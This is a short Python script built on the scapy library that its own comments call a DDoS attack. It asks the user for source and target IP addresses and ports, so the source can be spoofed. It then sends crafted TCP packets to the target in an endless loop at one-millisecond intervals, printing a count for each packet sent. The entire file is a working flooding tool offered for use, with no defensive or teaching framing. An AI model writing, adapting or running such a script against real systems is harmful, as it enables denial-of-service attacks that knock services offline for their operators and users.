
from scapy.all import *                                         #import scapy library
source_IP = input("Enter IP address of Source: ")               #Request for the source IP
target_IP = input("Enter IP address of Target: ")               #Request for the target IP
source_port = int(input("Enter Source Port Number:"))           #Request for the source port
dest_port = int(input("Enter Target Port Number:"))             #Request for the target port
i = 1                                                           #counter i initialized with 1

while True:                                                     #Infinite loop of ddos attack, will be terminated by ctrl + C command
	IP1 = IP(src = source_IP, dst = target_IP)
	TCP1 = TCP(sport = source_port, dport = dest_port)
	pkt = IP1 / TCP1
	send(pkt, inter = .001)
	print('packet sent', i)
	i=i+1
